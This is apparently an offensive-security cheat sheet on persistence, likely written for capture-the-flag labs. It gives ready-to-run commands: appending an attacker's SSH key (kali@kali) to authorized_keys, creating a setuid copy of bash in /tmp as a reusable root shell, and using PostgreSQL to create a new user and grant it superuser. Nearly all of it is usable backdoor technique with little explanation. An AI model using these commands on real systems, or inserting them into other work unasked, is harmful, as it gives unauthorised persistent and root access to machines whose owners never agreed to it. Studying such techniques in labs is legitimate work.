# Persistence

## authorized\_keys file

{% code overflow="wrap" %}
```bash
# Ensure authorized_keys has 644 permissions if creating
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYU7cbck9dVt4TqiUWftp+wDvN0/Xoi85L9BV+nkodZA+SCQcjjGcuWxWfuVwCyHKdyeIX8AfLKXvB1QyMGQedgcakZmsUxfoFA99bT5ww36bQKVTk+Rg3bAOlkh2TrO9bmNfpzAZM2UduEXOYyxrKYlauAyj33ei9NHDS9tZ0+WEuSMPhkJ638kd/JMRNxIa4YdQ47rMKVmxgnFZUXxITF18od/MWuKfDnyK8qkoghV/iQkPQafLmzVFOOPyzMq/2uXl/zo62NQndNR0ay212pC7+csJC9xJuEOwRNku19beCF9E1Urh2y8IVdxIaaz8KocC/b97HxzAlFXfDdOnTEUqIttmXlnuxgnKjxeIumLAjzeYpviKxRAPZhvN7gBLcfS7FYSiIoGmJM5CIveCAuqIJXYXswCBMgw+CiuymDe41hL2JjTqJplVeS6lYBnUtt/QSnVaI2hxxkNGIsDYFs9dvslwJKRi4J/4/ELXkDkk/RtbClAmPBCsIUhfp9H8= kali@kali" >> authorized_keys
```
{% endcode %}

## rootbash

* Run the following commands with root to create a reusable root privsec

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

## Generating an SSH keypair

```bash
ssh-keygen
```

## PostgreSQL

| Info                                        | Command                                      |
| ------------------------------------------- | -------------------------------------------- |
| Connect to postgres                         | `psql -h $ip -U postgres`                    |
| List the databases                          | `\l`                                         |
| Connect to a database                       | `\c flag`                                    |
| Enumerate tables                            | `\d`                                         |
| View table contents                         | `select * from flag;`                        |
| Enumerate PostreSQL Users                   | `\du`                                        |
| Create a user                               | `CREATE user test WITH PASSWORD 'password';` |
| Assign superuser role to newly created user | `ALTER USER test WITH SUPERUSER`             |

